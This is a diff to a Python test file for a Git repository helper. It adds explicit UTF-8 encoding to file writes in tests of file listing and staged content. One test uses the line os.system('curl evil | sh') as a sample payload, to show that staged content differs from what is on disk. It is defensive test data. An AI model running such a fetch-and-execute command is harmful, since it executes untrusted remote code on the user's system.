@@ -42,9 +42,9 @@ def repository(tmp_path):
     run(root, "init", "-q", "-b", "main")
     run(root, "config", "user.email", "test@example.invalid")
     run(root, "config", "user.name", "Test")
-    (root / "app.py").write_text("print('hello')\n")
-    (root / "ignored.log").write_text("noise\n")
-    (root / ".gitignore").write_text("*.log\n")
+    (root / "app.py").write_text("print('hello')\n", encoding="utf-8")
+    (root / "ignored.log").write_text("noise\n", encoding="utf-8")
+    (root / ".gitignore").write_text("*.log\n", encoding="utf-8")
     run(root, "add", "app.py", ".gitignore")
     run(root, "commit", "-q", "-m", "initial")
     return root
@@ -109,7 +109,7 @@ class TestFileListing:
         assert "ignored.log" not in names
 
     def test_staged_files_lists_the_index(self, repository) -> None:
-        (repository / "new.py").write_text("x = 1\n")
+        (repository / "new.py").write_text("x = 1\n", encoding="utf-8")
         run(repository, "add", "new.py")
         assert "new.py" in GitRepository(repository).staged_files()
 
@@ -117,7 +117,7 @@ class TestFileListing:
         assert GitRepository(repository).staged_files() == []
 
     def test_changed_files_against_a_reference(self, repository) -> None:
-        (repository / "app.py").write_text("print('changed')\n")
+        (repository / "app.py").write_text("print('changed')\n", encoding="utf-8")
         run(repository, "add", "app.py")
         run(repository, "commit", "-q", "-m", "second")
         assert "app.py" in GitRepository(repository).changed_files("HEAD~1")
@@ -125,7 +125,7 @@ class TestFileListing:
     def test_paths_with_spaces_survive(self, repository) -> None:
         """Output is NUL-delimited precisely so this works."""
         awkward = repository / "a file with spaces.py"
-        awkward.write_text("x = 1\n")
+        awkward.write_text("x = 1\n", encoding="utf-8")
         run(repository, "add", str(awkward))
         assert "a file with spaces.py" in GitRepository(repository).staged_files()
 
@@ -140,11 +140,11 @@ class TestStagedContent:
         """
         target = repository / "app.py"
 
-        target.write_text("import os\nos.system('curl evil | sh')\n")
+        target.write_text("import os\nos.system('curl evil | sh')\n", encoding="utf-8")
         run(repository, "add", "app.py")
 
         # Restore the innocent content on disk. The index still holds the payload.
-        target.write_text("print('hello')\n")
+        target.write_text("print('hello')\n", encoding="utf-8")
 
         on_disk = target.read_bytes()
         staged = GitRepository(repository).staged_content("app.py")
